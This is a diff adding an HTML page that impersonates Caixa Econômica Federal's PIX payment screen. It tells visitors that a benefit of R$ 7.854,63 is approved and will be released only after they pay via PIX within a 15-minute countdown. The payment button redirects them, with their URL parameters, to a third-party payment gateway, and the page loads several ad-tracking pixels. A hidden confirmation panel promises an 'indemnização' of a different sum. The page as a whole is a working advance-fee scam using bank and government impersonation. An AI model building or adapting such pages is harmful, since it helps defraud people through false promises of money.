@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<meta charset="utf-8">
+
+<head>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids data-utmify-ignore-iframe
+        async defer></script>
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '2853456888176959');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=2853456888176959&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+    <script src="https://otimizey-cdn.s3.us-east-1.amazonaws.com/scripts-utm-otimizey.js" async defer></script>;
+    <script>
+        window.pixelId = "68312b2ad323906a4dbab27f";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <meta charset="utf-8">
+    <script>
+        window.pixelId = "67ef67b0655738af4b8dbdd8";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caixa | Pagamento PIX</title>
+    <link rel="shortcut icon" href="public/assets/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../style.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        window.pixelId = "681d2fe390ec82153aab9fab";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids data-utmify-ignore-iframe
+        async defer></script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'primary': '#005CA9', // Cor primária Caixa
+                        'secondary': '#F39200', // Laranja Caixa
+                        'dark': '#333333', // Cor escura para textos
+                        'light': '#FFFFFF' // Cor clara para fundos
+                    },
+                    fontFamily: {
+                        'sans': ['FuturaBold', 'Arial', 'Helvetica', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap');
+
+        @font-face {
+            font-family: 'FuturaBold';
+            src: url('../fonts/futuraBold.eot');
+            src: url('../fonts/futuraBold.eot#iefix') format('embedded-opentype'),
+                url('../fonts/futuraBold.woff') format('woff'),
+                url('../fonts/futuraBold.ttf') format('truetype'),
+                url('../fonts/futuraBold.svg#futuraBold') format('svg');
+            font-weight: bold;
+            font-style: normal;
+        }
+
+        * {
+            font-family: 'Montserrat', Arial, Helvetica, sans-serif !important;
+        }
+
+        .title-bold,
+        h1,
+        h2,
+        h3,
+        .valor-aprovado,
+        button {
+            font-family: 'FuturaBold', 'Montserrat', Arial, sans-serif !important;
+        }
+
+        body {
+            font-family: 'Montserrat', Arial, Helvetica, sans-serif;
+            background-color: #F8F8F8;
+            color: #333;
+            overflow-x: hidden;
+            width: 100%;
+            position: relative;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            overflow-x: hidden;
+            width: 100%;
+        }
+
+        .govbr-container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Estilo para o header no estilo Caixa */
+        header {
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            background-color: #005CA9;
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        header img {
+            width: 110px;
+            margin: 10px;
+            height: auto;
+        }
+
+        .notification {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            background-color: #fff;
+            color: #333;
+            padding: 5px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: 'Montserrat', Arial, sans-serif;
+            z-index: 9999;
+            animation: fade-in 0.5s ease-in-out;
+        }
+
+        .notification button {
+            background: none;
+            border: none;
+            font-size: 12px;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .notification button:hover {
+            color: #ff0000;
+        }
+
+        @keyframes fade-in {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(-10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        header {
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            background-color: #005CA9;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        header img {
+            width: 110px;
+            margin: 10px;
+            height: auto;
+        }
+
+        header h1 {
+            color: #fff;
+            font-size: 2em;
+            margin: 0;
+            text-align: center;
+        }
+
+        /* Botões estilo Caixa */
+        .govbr-button {
+            background-color: #005CA9;
+            transition: all 0.3s ease;
+            color: white;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 16px;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 4px rgba(0, 92, 169, 0.3);
+        }
+
+        .govbr-button:hover {
+            background-color: #004a87;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 92, 169, 0.4);
+        }
+
+        .govbr-outline-button {
+            border: 2px solid #005CA9;
+            color: #005CA9;
+            transition: all 0.3s ease;
+            border-radius: 8px;
+        }
+
+        .govbr-outline-button:hover {
+            background-color: #005CA9;
+            color: white;
+        }
+
+        .govbr-card {
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        .govbr-input {
+            border: 2px solid #DDDDDD;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 16px;
+            width: 100%;
+            background-color: #F8F8F8;
+        }
+
+        .govbr-input:disabled {
+            background-color: #EFEFEF;
+            color: #555;
+        }
+
+        .govbr-badge {
+            background-color: #005CA9;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 16px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .govbr-timer {
+            color: #FF3333;
+            font-weight: bold;
+        }
+
+        .govbr-loading {
+            border-top-color: #005CA9;
+        }
+
+        .govbr-success-icon {
+            color: #005CA9;
+        }
+
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .valor-aprovado-container {
+            background-color: #F8F8F8;
+            border-left: 4px solid #005CA9;
+            padding: 12px;
+            margin: 16px 0;
+            text-align: left;
+        }
+
+        .valor-aprovado-label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+
+        .valor-aprovado {
+            color: #005CA9;
+            font-size: 28px;
+            font-weight: bold;
+            display: block;
+        }
+
+        /* Adiciona estilos para o popup de notificação */
+        .notification-popup {
+            position: fixed;
+            top: 20px;
+            right: -300px;
+            background-color: #005CA9;
+            color: white;
+            padding: 16px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 1000;
+            transition: right 0.3s ease-in-out;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .notification-popup.show {
+            right: 20px;
+        }
+
+        /* Estilo Caixa para os cards */
+        .bg-white {
+            border-radius: 8px;
+        }
+
+        /* Ajuste para cor de fundo no estilo Caixa */
+        .bg-yellow-500 {
+            background-color: #F39200 !important;
+        }
+
+        /* Ajuste para cor de fundo da barra informativa */
+        .bg-blue-600 {
+            background-color: #005CA9 !important;
+        }
+
+        /* Estilo Caixa para os containers */
+        .rounded-md {
+            border-radius: 8px;
+        }
+
+        /* Ajuste para cor verde de confirmação */
+        .bg-green-600 {
+            background-color: #005CA9 !important;
+        }
+
+        .text-green-600 {
+            color: #005CA9 !important;
+        }
+
+        /* Loading page com cores da Caixa */
+        #loadingPage {
+            background-color: rgba(66, 145, 219, 0.95) !important;
+        }
+
+        /* Adiciona uma barra superior no estilo da Caixa */
+        .caixa-topbar {
+            height: 5px;
+            background: linear-gradient(to right, #005CA9 70%, #F39200 30%);
+            width: 100%;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen">
+    <div class="caixa-topbar"></div>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=1614843185814109&ev=PageView&noscript=1" /></noscript>
+
+
+
+    <div id="notification" class="notification-popup">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+        </svg>
+        <span>Código PIX copiado!</span>
+    </div>
+    <!-- Header da Caixa -->
+    <header class="bg-white px-4 shadow-md">
+        <div class="max-w-[1200px] mx-auto flex items-center gap-6">
+            <img alt="Logo Caixa" width="1920" height="1080" class="w-auto h-12" style="color:transparent"
+                src="../images/logo-caixa.png">
+        </div>
+    </header>
+
+    <div id="loadingPage"
+        class="fixed inset-0 w-full h-full bg-[#005CA9]/95 z-50 flex items-center justify-center hidden fade-in">
+        <div class="flex flex-col items-center justify-center">
+            <div class="relative w-40 h-40 mb-8">
+                <!-- Logo com efeito de pulsação -->
+                <img src="../images/logo-caixa.png" alt="Logo Caixa"
+                    class="w-32 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-10 animate-pulse">
+
+                <!-- Anel de carregamento animado -->
+                <svg class="w-40 h-40 absolute top-0 left-0" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="50" cy="50" r="45" fill="none" stroke="rgba(255, 255, 255, 0.2)" stroke-width="6" />
+                    <circle cx="50" cy="50" r="45" fill="none" stroke="white" stroke-width="6" stroke-linecap="round"
+                        stroke-dasharray="283" stroke-dashoffset="100">
+                        <animateTransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="2s"
+                            repeatCount="indefinite" />
+                    </circle>
+                </svg>
+            </div>
+
+            <div class="text-center text-white">
+                <h1 class="text-2xl font-bold mb-3">
+                    Preparando seu pagamento
+                </h1>
+                <p id="loadingMessage" class="text-base opacity-90">
+                    Estamos gerando seu QR Code Pix...
+                </p>
+
+                <!-- Indicador de pontos carregando -->
+                <div class="flex justify-center mt-4 space-x-1">
+                    <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0s"></div>
+                    <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0.2s"></div>
+                    <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0.4s"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <main id="loginPage"
+        class="flex flex-col h-full gap-2 mt-10 rounded-md bg-white shadow-md w-96 py-4 mx-auto lg:w-1/3 govbr-card fade-in">
+        <!-- Cabeçalho com informações do serviço -->
+        <div class="px-6 py-3 bg-gray-100 border-b border-gray-200 flex items-center justify-between">
+            <div>
+                <h2 class="text-lg font-medium text-gray-800">Pagamento PIX</h2>
+                <p class="text-xs text-gray-500">Caixa Econômica Federal</p>
+            </div>
+            <div class="bg-yellow-500 text-xs font-medium px-2 py-1 rounded text-white">
+                Aguardando
+            </div>
+        </div>
+
+        <!-- Valor aprovado em formato mais profissional -->
+        <div class="valor-aprovado-container mx-6">
+            <div class="valor-aprovado-label">Valor aprovado:</div>
+            <div class="valor-aprovado">R$ 7.854,63</div>
+            <div class="timer mt-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24"
+                    stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+                Expira em: <span id="timer" class="font-bold ml-1">15:00</span>
+            </div>
+        </div>
+
+        <div class="bg-blue-600 py-3 px-6 text-white">
+            <p class="text-base">
+                <strong>IMPORTANTE:</strong> Efetue o pagamento via Pix dentro do prazo estipulado para que possamos
+                <strong>liberar seu benefício sem atrasos</strong>. Este é o último passo para assegurar o valor que é
+                seu por direito.
+            </p>
+        </div>
+
+        <div class="px-6 pt-4">
+
+
+            <button id="copiar-codigo" class="govbr-button w-full py-3 mt-4 flex items-center justify-center"
+                onclick="redirect(event)">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24"
+                    stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+                </svg>
+                IR PARA PAGAMENTO
+            </button>
+            <script>
+                function redirect(event) {
+                    event.preventDefault();
+                    var currentUrlParams = window.location.search;
+                    window.location.href = "https://go.zeroonepay.com.br/9pa5keb5jt" + currentUrlParams;
+                }
+            </script>
+
+        </div>
+    </main>
+
+    <!-- Nova div para pagamento confirmado -->
+    <div id="pagamentoConfirmado"
+        class="hidden flex flex-col h-full gap-2 mt-10 rounded-md bg-white shadow-md w-96 py-2 mx-auto lg:w-1/3 govbr-card fade-in">
+        <div class="bg-green-600 rounded-t-md py-3 px-6 text-white">
+            <h1 class="text-2xl font-bold">Pagamento Confirmado!</h1>
+        </div>
+        <div class="px-6 pt-4">
+            <div class="flex flex-col gap-4 items-center justify-center py-8">
+                <svg class="w-20 h-20 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                </svg>
+                <p class="text-lg font-bold">Sua indenização será creditada em breve</p>
+                <div class="bg-gray-100 p-4 rounded-md w-full mt-4">
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="text-sm text-gray-600">Valor:</span>
+                        <span class="font-bold">R$ 5.960,50</span>
+                    </div>
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="text-sm text-gray-600">Data:</span>
+                        <span id="data-pagamento">00/00/0000</span>
+                    </div>
+                    <div class="flex justify-between items-center">
+                        <span class="text-sm text-gray-600">Protocolo:</span>
+                        <span id="protocolo-pagamento">GOV-2023-5960</span>
+                    </div>
+                </div>
+                <p class="text-sm text-gray-600 mt-4">Agradecemos por utilizar os serviços da Caixa Econômica Federal
+                </p>
+            </div>
+        </div>
+    </div>
+
+   
+</body>
+
+</html>
